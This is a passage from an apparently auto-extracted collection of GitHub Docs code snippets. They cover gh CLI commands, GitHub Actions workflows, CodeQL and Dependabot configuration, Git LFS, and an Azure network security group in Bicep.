Liquid\nCODE:\n```\n{% ifversion fpt %}\n\nAlpha\n\n{% ifversion ghes != 2.13 %}\n\nBravo\n\n{% endif %}\n\n{% else %}\n\nCharlie\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Fetching the current user's name\nDESCRIPTION: Fetches the current user's name using the `gh api user` command and filters the JSON output with `jq` to extract only the name. This demonstrates how to use `jq` to parse and extract specific data from JSON responses.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/creating-github-cli-extensions.md#_snippet_11\n\nLANGUAGE: Shell\nCODE:\n```\ngh api user --jq '.name'\n```\n\n----------------------------------------\n\nTITLE: qlpack.yml - Defining Pack Name (YAML)\nDESCRIPTION: This YAML snippet shows how to define the `name` property in a `qlpack.yml` file. The name is required for all packs, defines the scope of the pack and its name using alphanumeric characters and hyphens. It must be unique to avoid conflicts.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/publishing-and-using-codeql-packs.md#_snippet_7\n\nLANGUAGE: YAML\nCODE:\n```\nname: octo-org/security-queries\n```\n\n----------------------------------------\n\nTITLE: Defining Matrix and Producing Artifacts YAML\nDESCRIPTION: This YAML snippet defines a GitHub Actions workflow that demonstrates defining a matrix of colors in the `define-matrix` job.  The `produce-artifacts` job uses this matrix to produce an artifact for each color. The matrix values are passed between jobs using `outputs` and `needs`. The artifact upload uses an action reusable. The workflow triggers on push and workflow dispatch.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/matrix-used-twice.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\nname: shared matrix\non:\n  push:\n  workflow_dispatch:\n\njobs:\n  define-matrix:\n    runs-on: ubuntu-latest\n\n    outputs:\n      colors: {% raw %}${{ steps.colors.outputs.colors }}{% endraw %}\n\n    steps:\n      - name: Define Colors\n        id: colors\n        run: |\n          echo 'colors=[\"red\", \"green\", \"blue\"]' >> \"$GITHUB_OUTPUT\"\n\n  produce-artifacts:\n    runs-on: ubuntu-latest\n    needs: define-matrix\n    strategy:\n      matrix:\n        color: {% raw %}${{ fromJSON(needs.define-matrix.outputs.colors) }}{% endraw %}\n\n    steps:\n      - name: Define Color\n        env:\n          color: {% raw %}${{ matrix.color }}{% endraw %}\n        run: |\n          echo \"$color\" > color\n      - name: Produce Artifact\n        uses: {% data reusables.actions.action-upload-artifact %}\n        with:\n          name: {% raw %}${{ matrix.color }}{% endraw %}\n          path: color\n```\n\n----------------------------------------\n\nTITLE: Listing GitHub codespaces using gh codespace list\nDESCRIPTION: This command lists the existing codespaces for the authenticated user.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/quickstart.md#_snippet_9\n\nLANGUAGE: Shell\nCODE:\n```\ngh codespace list\n```\n\n----------------------------------------\n\nTITLE: Example Codespaces Badge in Markdown\nDESCRIPTION: This snippet shows a complete example of the \"Open in GitHub Codespaces\" badge, including the URL to the GitHub Docs repository. This allows users to create a codespace directly from the README file. The image URL points to a standard GitHub badge, and the link goes to `https://codespaces.new/github/docs`.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/setting-up-your-project-for-codespaces/setting-up-your-repository/facilitating-quick-creation-and-resumption-of-codespaces.md#_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n[![Open in GitHub Codespaces](https://github.com/codespaces/badge.svg)](https://codespaces.new/github/docs)\n```\n\n----------------------------------------\n\nTITLE: Executing gh COMMAND --help\nDESCRIPTION: This snippet shows how to execute a GitHub CLI command or subcommand with the --help flag to view help information. Replace COMMAND with the specific command or subcommand. No dependencies are required.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/github-cli-reference.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ngh COMMAND [SUBCOMMAND ...] --help\n```\n\n----------------------------------------\n\nTITLE: Path Qualifier with Question Mark Glob\nDESCRIPTION: This snippet demonstrates the `?` glob character in the `path:` qualifier to match one character. It searches for paths like `file.aac` or `file.abc`.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/github-code-search/understanding-github-code-search-syntax.md#_snippet_19\n\nLANGUAGE: text\nCODE:\n```\npath:*.a?c\n```\n\n----------------------------------------\n\nTITLE: Defining Logging Aspect with aspectlib (Python)\nDESCRIPTION: This code defines an aspect for logging using the `aspectlib` library.  The `log_method_call` function is decorated with `@aspectlib.Aspect` and acts as an advice that gets weaved into methods. It logs entry, exit, and any exceptions raised by the intercepted method. Requires the `aspectlib` package.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/refactoring-code/handling-cross-cutting-concerns.md#_snippet_3\n\nLANGUAGE: python\nCODE:\n```\nimport aspectlib\nimport logging\n\n@aspectlib.Aspect(bind=True)\ndef log_method_call(cutpoint, *args, **kwargs):\n    logger = logging.getLogger()\n    method_name = cutpoint.__name__\n    logger.info(f\"Entering method: {method_name}\")\n    try:\n        result = yield aspectlib.Proceed\n        logger.info(f\"Method {method_name} executed successfully.\")\n        return result\n    except Exception as e:\n        logger.error(f\"Error in method {method_name}: {e}\")\n        raise\n    finally:\n        logger.info(f\"Exiting method: {method_name}\")\n```\n\n----------------------------------------\n\nTITLE: Running Commands with Bash Shell (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to run a command using the Bash shell in a GitHub Actions workflow.  It uses the `shell` keyword to explicitly specify `bash` as the shell interpreter for the `run` step.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_20\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  - name: Display the path\n    shell: bash\n    run: echo $PATH\n```\n\n----------------------------------------\n\nTITLE: Git LFS Pointer File Format\nDESCRIPTION: This code snippet shows the structure of a Git LFS pointer file. It includes the LFS version, the object ID (OID) using SHA256, and the file size. This pointer file is used to track large files without storing them directly in the Git repository.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/working-with-files/managing-large-files/about-git-large-file-storage.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nversion {% data variables.large_files.version_name %}\noid sha256:4cac19622fc3ada9c0fdeadb33f88f367b541f38b89102a3f1261ac81fd5bcb5\nsize 84977953\n```\n\n----------------------------------------\n\nTITLE: Initializing Services and Logging in main.py (Python)\nDESCRIPTION: This code initializes several service classes (PaymentService, OrderService, ShippingService, InventoryService, and NotificationService), sets up basic logging, and then calls methods on each service. It demonstrates how service objects are created and used in the main application entry point.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/refactoring-code/handling-cross-cutting-concerns.md#_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nimport logging\nfrom logging_config import setup_logging\nfrom payment_service import PaymentService\nfrom order_service import OrderService\nfrom shipping_service import ShippingService\nfrom inventory_service import InventoryService\nfrom notification_service import NotificationService\n\ndef main():\n    setup_logging()\n    payment_service = PaymentService()\n    order_service = OrderService()\n    shipping_service = ShippingService()\n    inventory_service = InventoryService()\n    notification_service = NotificationService()\n\n    # Example usage\n    payment_service.process_payment({\"amount\": 100, \"currency\": \"USD\"})\n    order_service.place_order({\"item\": \"Book\", \"quantity\": 1})\n    shipping_service.ship_order({\"item\": \"Book\", \"quantity\": 1})\n    inventory_service.update_inventory(\"Book\", -1)\n    notification_service.send_notification(\"Order has been placed and shipped.\")\n\nif __name__ == \"__main__\":\n    main()\n```\n\n----------------------------------------\n\nTITLE: Checking Runner Service Status - Windows\nDESCRIPTION: Checks the status of the self-hosted runner service on Windows using PowerShell. Requires the `actions.runner.*` service name. The service name is stored in `service_win_name` variable.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/configuring-the-self-hosted-runner-application-as-a-service.md#_snippet_6\n\nLANGUAGE: powershell\nCODE:\n```\nGet-Service \"{{ service_win_name }}\"\n```\n\n----------------------------------------\n\nTITLE: Setting Environment Variables with Shell (Terminal)\nDESCRIPTION: These shell commands set the environment variables `GH_PAT` and `GH_SOURCE_PAT` to store personal access tokens (PATs) for accessing the destination enterprise and source organization, respectively. These variables are required for authenticating the GitHub CLI during the migration process. The commands are specifically for use in a Terminal environment.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-between-github-products/migrating-organizations-from-githubcom-to-github-enterprise-cloud.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nexport GH_PAT=\"TOKEN\"\nexport GH_SOURCE_PAT=\"TOKEN\"\n```\n\n----------------------------------------\n\nTITLE: Install Smee Client\nDESCRIPTION: This shell command installs the Smee client globally using npm. Smee is used to forward webhook events from GitHub to a local development environment.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --global smee-client\n```\n\n----------------------------------------\n\nTITLE: Markdown Element Example\nDESCRIPTION: This YAML snippet demonstrates the use of the `markdown` element to display text within a form.  It includes examples of using both a single line with a header and multi-line text using the pipe operator.  The `value` attribute specifies the text to be rendered.\nSOURCE: https://github.com/github/docs/blob/main/content/communities/using-templates-to-encourage-useful-issues-and-pull-requests/syntax-for-githubs-form-schema.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\nbody:\n- type: markdown\n  attributes:\n    value: \"## Thank you for contributing to our project!\"\n- type: markdown\n  attributes:\n    value: |\n      Thanks for taking the time to fill out this bug report.\n```\n\n----------------------------------------\n\nTITLE: Calculating Days Between Dates in Java\nDESCRIPTION: This Java snippet calculates the number of days between two given Date objects.  It requires java.util.Date and likely uses a Calendar object internally for accurate calculation, although the full implementation is not present.  It takes two Date objects as input and returns an integer representing the number of days between them.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/copilot/java-int-snippet.md#_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nprivate int calculateDaysBetweenDates(Date date1,\n```\n\n----------------------------------------\n\nTITLE: Removing a Node from a Cluster (ghe-remove-node)\nDESCRIPTION: This command removes a node from a GitHub Enterprise Server cluster. It requires the hostname of the node to be removed. The command evacuates data, marks the node as offline, and stops traffic routing.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_47\n\nLANGUAGE: shell\nCODE:\n```\nghe-remove-node HOSTNAME\n```\n\n----------------------------------------\n\nTITLE: Filtering Subfolder with git-filter-repo\nDESCRIPTION: Filters the repository history to include only the specified subfolder. This requires `git-filter-repo` to be installed. Replace `FOLDER-NAME` with the actual subfolder name.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/splitting-a-subfolder-out-into-a-new-repository.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\n$ git filter-repo --path FOLDER-NAME/\n# Filter the specified branch in your directory and remove empty commits\n```\n\n----------------------------------------\n\nTITLE: Finding Self-Hosted Runner Service Name via systemctl - Shell\nDESCRIPTION: This command searches for the self-hosted runner service name using `systemctl`, filtering for services containing \"actions.runner\".  It returns the service name if the service is running. This command is intended for use on Linux systems utilizing systemd.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners/monitoring-and-troubleshooting-self-hosted-runners.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\n$ systemctl --type=service | grep actions.runner\nactions.runner.octo-org-octo-repo.hostname.service loaded active running GitHub Actions Runner (octo-org-octo-repo.hostname)\n```\n\n----------------------------------------\n\nTITLE: Specifying CodeQL Query Packs in Configuration File\nDESCRIPTION: This YAML snippet shows how to specify CodeQL query packs within a custom configuration file. The packs are specified in an array format, allowing for different versions and paths to queries within the packs.  This snippet focuses on the configuration file's internal structure, in contrast to workflow specification.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/customizing-your-advanced-setup-for-code-scanning.md#_snippet_15\n\nLANGUAGE: yaml\nCODE:\n```\n{% raw %}\npacks:\n  # Use the latest version of 'pack1' published by 'scope'\n  - scope/pack1\n  # Use version 1.2.3 of 'pack2'\n  - scope/pack2@1.2.3\n  # Use the latest version of 'pack3' compatible with 3.2.1\n  - scope/pack3@~3.2.1\n  # Use pack4 and restrict it to queries found in the 'path/to/queries' directory\n  - scope/pack4:path/to/queries\n  # Use pack5 and restrict it to the query 'path/to/single/query.ql'\n  - scope/pack5:path/to/single/query.ql\n  # Use pack6 and restrict it to the query suite 'path/to/suite.qls'\n  - scope/pack6:path/to/suite.qls\n{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Installing GitHub CLI extension for Bitbucket Server migration in Shell\nDESCRIPTION: This command installs the `gh-bbs2gh` extension for the GitHub CLI, enabling migration from Bitbucket Server to GitHub Enterprise Cloud. It requires the GitHub CLI to be installed. The command downloads and installs the extension from the specified GitHub repository.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-from-bitbucket-server-to-github-enterprise-cloud/migrating-repositories-from-bitbucket-server-to-github-enterprise-cloud.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh extension install github/gh-bbs2gh\n```\n\n----------------------------------------\n\nTITLE: Inefficient Prime Number Generation\nDESCRIPTION: This Python code calculates and prints every 1000th prime number up to the 10,000th prime. It uses a naive `is_prime` function that checks divisibility for each number, resulting in slow performance. The code includes a timer to measure the execution time. The primary bottleneck is the inefficient prime number calculation algorithm.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/refactoring-code/refactoring-for-performance-optimization.md#_snippet_0\n\nLANGUAGE: python\nCODE:\n```\nimport time\n\ndef is_prime(n):\n    if n <= 1:\n        return False\n    for i in range(2, n):\n        if n % i == 0:\n            return False\n    return True\n\ndef every_1000th_prime():\n    primes = []\n    num = 2\n    while len(primes) < 10000:\n        if is_prime(num):\n            primes.append(num)\n        num += 1\n    return [primes[i] for i in range(999, 10000, 1000)]\n\nif __name__ == \"__main__\":\n    start_time = time.time()\n    primes = every_1000th_prime()\n    for prime in primes:\n        print(prime)\n    end_time = time.time()\n    elapsed_time = end_time - start_time\n    print(f\"Time taken: {elapsed_time:.10f} seconds\")\n```\n\n----------------------------------------\n\nTITLE: Grouping Minor/Patch Updates and Ignoring Major Updates in Dependabot\nDESCRIPTION: This YAML configuration for Dependabot defines groups for npm dependencies, specifically targeting `@angular*` packages.  It creates `angular` and `minor-and-patch` groups to handle version and security updates.  It groups minor and patch updates while ignoring major updates by using `ignore` to prevent automatic pull requests for major version updates. The configuration specifies weekly updates.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/dependabot/dependabot-version-updates-groups-yaml-example.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nversion: 2\nupdates:\n  # Keep npm dependencies up to date\n  - package-ecosystem: \"npm\"\n    directory: \"/\"\n    schedule:\n      interval: \"weekly\"\n    groups:\n      angular:{% ifversion dependabot-grouped-security-updates-config %}\n        applies-to: version-updates{%- endif %}\n        patterns:\n          - \"@angular*\"\n        update-types:\n          - \"minor\"\n          - \"patch\"{% ifversion dependabot-grouped-security-updates-config %}\n      minor-and-patch:\n        applies-to: security-updates\n        patterns:\n          - \"@angular*\"\n        update-types:\n          - \"patch\"\n          - \"minor\"{%- endif %}\n    ignore:\n      - dependency-name: \"@angular*\"\n        update-types: [\"version-update:semver-major\"]\n```\n\n----------------------------------------\n\nTITLE: Displaying Default Git LFS Configuration\nDESCRIPTION: This snippet shows the default Git LFS configuration using `git lfs env`. It then creates a `.lfsconfig` file to point to a third-party LFS server using `git config`. Finally, it displays the content of the `.lfsconfig` file using `cat`.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-accounts-and-repositories/managing-repositories-in-your-enterprise/configuring-git-large-file-storage-for-your-enterprise.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\n# Show default configuration\n$ git lfs env\n> git-lfs/1.1.0 (GitHub; darwin amd64; go 1.5.1; git 94d356c)\n> git version 2.7.4 (Apple Git-66)\n&nbsp;\n> Endpoint=https://GITHUB-ENTERPRISE-HOST/path/to/repo/info/lfs (auth=basic)\n&nbsp;\n# Create .lfsconfig that points to third party server.\n$ git config -f .lfsconfig remote.origin.lfsurl https://THIRD-PARTY-LFS-SERVER/path/to/repo\n$ git lfs env\n> git-lfs/1.1.0 (GitHub; darwin amd64; go 1.5.1; git 94d356c)\n> git version 2.7.4 (Apple Git-66)\n&nbsp;\n> Endpoint=https://THIRD-PARTY-LFS-SERVER/path/to/repo/info/lfs (auth=none)\n&nbsp;\n# Show the contents of .lfsconfig\n$ cat .lfsconfig\n[remote \"origin\"]\nlfsurl = https://THIRD-PARTY-LFS-SERVER/path/to/repo\n```\n\n----------------------------------------\n\nTITLE: Fetching API V2 in JavaScript\nDESCRIPTION: This JavaScript code snippet uses the `fetch` API to make a request to the `/api/v2` endpoint. The `HOSTNAME` placeholder will *not* be dynamically replaced because the `replacedomain` annotation is absent. It depends on the `fetch` API being available in the execution environment.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/markdown/replace-domain.md#_snippet_3\n\nLANGUAGE: js\nCODE:\n```\nawait fetch(\"https://HOSTNAME/api/v2\")\n```\n\n----------------------------------------\n\nTITLE: Confirming repository email address in Git\nDESCRIPTION: Retrieves and displays the email address configured for the current Git repository. This helps confirm that the email address has been set correctly for the repository.\nSOURCE: https://github.com/github/docs/blob/main/content/account-and-profile/setting-up-and-managing-your-personal-account-on-github/managing-email-preferences/setting-your-commit-email-address.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\n$ git config user.email\nemail@example.com\n```\n\n----------------------------------------\n\nTITLE: Running MinIO in Standalone Mode with Docker (Shell)\nDESCRIPTION: This command runs MinIO in standalone mode using Docker. It maps port 9000 on the host to port 9000 on the container, mounts the directory specified by `MINIO_DIR` to `/data` in the container, and sets the access and secret keys using environment variables. Requires the MINIO_DIR, MINIO_ACCESS_KEY and MINIO_SECRET_KEY environment variables to be set.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-packages/quickstart-for-configuring-your-minio-storage-bucket-for-github-packages.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\n$ docker run -p 9000:9000 \\\n            -v $MINIO_DIR:/data \\\n            -e \"MINIO_ACCESS_KEY=$MINIO_ACCESS_KEY\" \\\n            -e \"MINIO_SECRET_KEY=$MINIO_SECRET_KEY\" \\\n            minio/minio server /data\n```\n\n----------------------------------------\n\nTITLE: Writing Inline Math Expressions with Backtick Delimiters\nDESCRIPTION: This snippet demonstrates how to write inline mathematical expressions using backticks and dollar signs ($`...`$) as delimiters in Markdown on GitHub. This is useful when the expression contains characters that overlap with markdown syntax.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/working-with-advanced-formatting/writing-mathematical-expressions.md#_snippet_1\n\nLANGUAGE: text\nCODE:\n```\nThis sentence uses $\\` and \\`$ delimiters to show math inline: $`\\sqrt{3x-1}+(1+x)^2`$\n```\n\n----------------------------------------\n\nTITLE: Committing the Renamed File with git commit\nDESCRIPTION: This snippet demonstrates how to commit the renamed file changes to the local Git repository using `git commit`. It includes a commit message describing the change. It relies on the file being staged for commit via `git mv`.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/working-with-files/managing-files/renaming-a-file.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n$ git commit -m \"Rename file\"\n# Commits the tracked changes and prepares them to be pushed to a remote repository.\n# {% data reusables.git.reset-head-to-previous-commit-codeblock %}\n```\n\n----------------------------------------\n\nTITLE: Docker login with PAT (Shell)\nDESCRIPTION: This snippet demonstrates how to authenticate to the GitHub Container Registry using a personal access token stored in the `CR_PAT` environment variable. It utilizes `docker login` with the `--password-stdin` option to securely pass the token as a password.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/package_registry/authenticate-to-container-registry-steps.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\n$ echo $CR_PAT | docker login {% data reusables.package_registry.container-registry-hostname %} -u USERNAME --password-stdin\n```\n\n----------------------------------------\n\nTITLE: Verify Connection and Enable Replica Mode\nDESCRIPTION: Verifies the connection to the new primary and enables replica mode for the new replica using `ghe-repl-setup`. Requires the IP address of the former replica appliance.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-high-availability/recovering-a-high-availability-configuration.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nghe-repl-setup FORMER_REPLICA_IP\n```\n\n----------------------------------------\n\nTITLE: Configuring Gradle Groovy repository\nDESCRIPTION: This snippet illustrates how to configure a Gradle Groovy project to use a GitHub Packages repository. It sets the repository URL and authentication credentials.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-gradle-registry.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\nrepositories {\n    maven {\n        url = uri(\"https://{% ifversion fpt or ghec %}maven.pkg.github.com{% else %}REGISTRY_URL{% endif %}/OWNER/REPOSITORY\")\n        credentials {\n            username = project.findProperty(\"gpr.user\") ?: System.getenv(\"USERNAME\")\n            password = project.findProperty(\"gpr.key\") ?: System.getenv(\"TOKEN\")\n        }\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Example: Adding Simple Job Summary using Bash\nDESCRIPTION: This bash script adds a simple \"Hello world! :rocket:\" message to the job summary by appending to the `$GITHUB_STEP_SUMMARY` file.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_44\n\nLANGUAGE: bash\nCODE:\n```\necho \"### Hello world! :rocket:\" >> $GITHUB_STEP_SUMMARY\n```\n\n----------------------------------------\n\nTITLE: Deploying Azure Network Security Group with Bicep\nDESCRIPTION: This Bicep script defines a Network Security Group (NSG) with several outbound security rules. These rules allow outbound traffic to the Azure Virtual Network, specific GitHub Actions IP ranges, GitHub IP ranges, and Azure Storage. Parameters include the location and NSG name. It utilizes the `Microsoft.Network/networkSecurityGroups` resource type to create and configure the NSG.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/azure-vnet-procedures-prereqs.md#_snippet_0\n\nLANGUAGE: bicep\nCODE:\n```\n@description('NSG for outbound rules')\nparam location string\nparam nsgName string = 'actions_NSG'\n\nresource actions_NSG 'Microsoft.Network/networkSecurityGroups@2017-06-01' = {\n  name: nsgName\n  location: location\n  properties: {\n    securityRules: [\n      {\n        name: 'AllowVnetOutBoundOverwrite'\n        properties: {\n          protocol: 'TCP'\n          sourcePortRange: '*'\n          destinationPortRange: '443'\n          sourceAddressPrefix: '*'\n          destinationAddressPrefix: 'VirtualNetwork'\n          access: 'Allow'\n          priority: 200\n          direction: 'Outbound'\n          destinationAddressPrefixes: []\n        }\n      }\n      {\n        name: 'AllowOutBoundActions'\n        properties: {\n          protocol: '*'\n          sourcePortRange: '*'\n          destinationPortRange: '443'\n          sourceAddressPrefix: '*'\n          access: 'Allow'\n          priority: 210\n          direction: 'Outbound'\n          destinationAddressPrefixes: [\n            '4.175.114.51/32'\n            '20.102.35.120/32'\n            '4.175.114.43/32'\n            '20.72.125.48/32'\n            '20.19.5.100/32'\n            '20.7.92.46/32'\n            '20.232.252.48/32'\n            '52.186.44.51/32'\n            '20.22.98.201/32'\n            '20.246.184.240/32'\n            '20.96.133.71/32'\n            '20.253.2.203/32'\n            '20.102.39.220/32'\n            '20.81.127.181/32'\n            '52.148.30.208/32'\n            '20.14.42.190/32'\n            '20.85.159.192/32'\n            '52.224.205.173/32'\n            '20.118.176.156/32'\n            '20.236.207.188/32'\n            '20.242.161.191/32'\n            '20.166.216.139/32'\n            '20.253.126.26/32'\n            '52.152.245.137/32'\n            '40.118.236.116/32'\n            '20.185.75.138/32'\n            '20.96.226.211/32'\n            '52.167.78.33/32'\n            '20.105.13.142/32'\n            '20.253.95.3/32'\n            '20.221.96.90/32'\n            '51.138.235.85/32'\n            '52.186.47.208/32'\n            '20.7.220.66/32'\n            '20.75.4.210/32'\n            '20.120.75.171/32'\n            '20.98.183.48/32'\n            '20.84.200.15/32'\n            '20.14.235.135/32'\n            '20.10.226.54/32'\n            '20.22.166.15/32'\n            '20.65.21.88/32'\n            '20.102.36.236/32'\n            '20.124.56.57/32'\n            '20.94.100.174/32'\n            '20.102.166.33/32'\n            '20.31.193.160/32'\n            '20.232.77.7/32'\n            '20.102.38.122/32'\n            '20.102.39.57/32'\n            '20.85.108.33/32'\n            '40.88.240.168/32'\n            '20.69.187.19/32'\n            '20.246.192.124/32'\n            '20.4.161.108/32'\n            '20.22.22.84/32'\n            '20.1.250.47/32'\n            '20.237.33.78/32'\n            '20.242.179.206/32'\n            '40.88.239.133/32'\n            '20.121.247.125/32'\n            '20.106.107.180/32'\n            '20.22.118.40/32'\n            '20.15.240.48/32'\n            '20.84.218.150/32'\n          ]\n        }\n      }\n      {\n        name: 'AllowOutBoundGitHub'\n        properties: {\n          protocol: '*'\n          sourcePortRange: '*'\n          destinationPortRange: '443'\n          sourceAddressPrefix: '*'\n          access: 'Allow'\n          priority: 220\n          direction: 'Outbound'\n          destinationAddressPrefixes: [\n            '140.82.112.0/20'\n            '143.55.64.0/20'\n            '185.199.108.0/22'\n            '192.30.252.0/22'\n            '20.175.192.146/32'\n            '20.175.192.147/32'\n            '20.175.192.149/32'\n            '20.175.192.150/32'\n            '20.199.39.227/32'\n            '20.199.39.228/32'\n            '20.199.39.231/32'\n            '20.199.39.232/32'\n            '20.200.245.241/32'\n            '20.200.245.245/32'\n            '20.200.245.246/32'\n            '20.200.245.247/32'\n            '20.200.245.248/32'\n            '20.201.28.144/32'\n            '20.201.28.148/32'\n            '20.201.28.149/32'\n            '20.201.28.151/32'\n            '20.201.28.152/32'\n            '20.205.243.160/32'\n            '20.205.243.164/32'\n            '20.205.243.165/32'\n            '20.205.243.166/32'\n            '20.205.243.168/32'\n            '20.207.73.82/32'\n            '20.207.73.83/32'\n            '20.207.73.85/32'\n            '20.207.73.86/32'\n            '20.207.73.88/32'\n            '20.217.135.1/32'\n            '20.233.83.145/32'\n            '20.233.83.146/32'\n            '20.233.83.147/32'\n            '20.233.83.149/32'\n            '20.233.83.150/32'\n            '20.248.137.48/32'\n            '20.248.137.49/32'\n            '20.248.137.50/32'\n            '20.248.137.52/32'\n            '20.248.137.55/32'\n            '20.26.156.215/32'\n            '20.26.156.216/32'\n            '20.26.156.211/32'\n            '20.27.177.113/32'\n            '20.27.177.114/32'\n            '20.27.177.116/32'\n            '20.27.177.117/32'\n            '20.27.177.118/32'\n            '20.29.134.17/32'\n            '20.29.134.18/32'\n            '20.29.134.19/32'\n            '20.29.134.23/32'\n            '20.29.134.24/32'\n            '20.87.245.0/32'\n            '20.87.245.1/32'\n            '20.87.245.4/32'\n            '20.87.245.6/32'\n            '20.87.245.7/32'\n            '4.208.26.196/32'\n            '4.208.26.197/32'\n            '4.208.26.198/32'\n            '4.208.26.199/32'\n            '4.208.26.200/32'\n            '4.225.11.196/32'\n            '4.237.22.32/32'\n          ]\n        }\n      }\n      {\n        name: 'AllowStorageOutbound'\n        properties: {\n          protocol: '*'\n          sourcePortRange: '*'\n          destinationPortRange: '443'\n          sourceAddressPrefix: '*'\n          destinationAddressPrefix: 'Storage'\n          access: 'Allow'\n          priority: 230\n          direction: 'Outbound'\n          destinationAddressPrefixes: []\n        }\n      }\n    ]\n  }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Generating Conflict List - Shell\nDESCRIPTION: This command generates a `conflicts.csv` file containing a list of migration conflicts using the `ghe-migrator conflicts` command. It requires the Migration GUID and outputs the conflicts to a CSV file. If no conflicts are reported, the data can be safely imported.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-ghe-migrator/migrating-data-to-github-enterprise-server.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nghe-migrator conflicts -g MIGRATION-GUID > conflicts.csv\n```\n\n----------------------------------------\n\nTITLE: Enabling dependency graph via administrative shell\nDESCRIPTION: This snippet demonstrates how to enable the dependency graph in GitHub Enterprise using the administrative shell.  It involves using the `ghe-config` command to set the `app.dependency-graph.enabled` property to `true`. The shell should be accessed via SSH.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-code-security/managing-supply-chain-security-for-your-enterprise/enabling-the-dependency-graph-for-your-enterprise.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nghe-config app.dependency-graph.enabled true\n```\n\n----------------------------------------\n\nTITLE: Example of Successful Production Migration Output\nDESCRIPTION: This example demonstrates the output of a successful `gh actions-importer migrate bamboo deployment` command. It shows the path to the logs and the URL of the pull request created with the converted workflow.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bamboo-with-github-actions-importer.md#_snippet_12\n\nLANGUAGE: Shell\nCODE:\n```\n$ gh actions-importer migrate bamboo deployment --deployment-project-id 123 --target-url https://github.com/octo-org/octo-repo --output-dir tmp/migrate\n[2023-04-20 22:08:20] Logs: 'tmp/migrate/log/actions-importer-20230420-014033.log'\n[2023-04-20 22:08:20] Pull request: 'https://github.com/octo-org/octo-repo/pull/1'\n```\n\n----------------------------------------\n\nTITLE: Forecasting GitHub Actions Usage with CLI\nDESCRIPTION: This shell command forecasts potential GitHub Actions usage based on completed CircleCI pipeline runs. It generates a report containing metrics like job count, pipeline count, execution time, queue time, and concurrent jobs in the specified output directory.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-circleci-with-github-actions-importer.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer forecast 